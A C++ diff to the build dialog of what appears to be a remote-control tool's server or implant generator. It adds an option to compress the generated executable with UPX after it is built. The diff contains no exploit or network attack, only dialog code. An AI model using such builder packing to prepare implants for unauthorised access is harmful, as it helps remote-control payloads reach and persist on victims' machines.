@@ -77,6 +77,7 @@ void CBuildDlg::DoDataExchange(CDataExchange* pDX)
 	DDX_Control(pDX, IDC_COMBO_RUNTYPE, m_ComboRunType);
 	DDX_Control(pDX, IDC_COMBO_PROTO, m_ComboProto);
 	DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
+	DDX_Control(pDX, IDC_COMBO_COMPRESS, m_ComboCompress);
 }
 
 
@@ -89,6 +90,8 @@ END_MESSAGE_MAP()
 
 // CBuildDlg 消息处理程序
 
+std::string ReleaseUPX();
+void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, bool isCompress);
 
 void CBuildDlg::OnBnClickedOk()
 {
@@ -216,7 +219,14 @@ void CBuildDlg::OnBnClickedOk()
 		File.Close();
 		CString tip = index == IndexTestRun_DLL ? "\r\n提示: 请生成\"ServerDll.dll\"，以便程序正常运行。" : "";
 		tip += g_ConnectAddress.protoType==PROTO_KCP ? "\n提示: 使用KCP协议生成服务，必须设置主控UDP协议参数为1。" : "";
-		MessageBox("生成成功! 文件位于:\r\n"+ strSeverFile + tip, "提示", MB_ICONINFORMATION);
+		std::string upx;
+		if(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_UPX) upx = ReleaseUPX();
+		if (!upx.empty())
+		{
+			run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
+			MessageBox("正在UPX压缩，请关注信息提示。\r\n文件位于: " + strSeverFile + tip, "提示", MB_ICONINFORMATION);
+		}else 
+			MessageBox("生成成功! 文件位于:\r\n"+ strSeverFile + tip, "提示", MB_ICONINFORMATION);
 		SAFE_DELETE_ARRAY(szBuffer);
 		if (index == IndexTestRun_DLL) return;
 	}
@@ -277,6 +287,10 @@ BOOL CBuildDlg::OnInitDialog()
 	m_ComboEncrypt.InsertString(PROTOCOL_SHINE, "Shine");
 	m_ComboEncrypt.InsertString(PROTOCOL_HELL, "HELL");
 	m_ComboEncrypt.SetCurSel(PROTOCOL_SHINE);
+
+	m_ComboCompress.InsertString(CLIENT_COMPRESS_NONE, "无");
+	m_ComboCompress.InsertString(CLIENT_COMPRESS_UPX, "UPX");
+	m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);
 
 	m_OtherItem.ShowWindow(SW_HIDE);
 
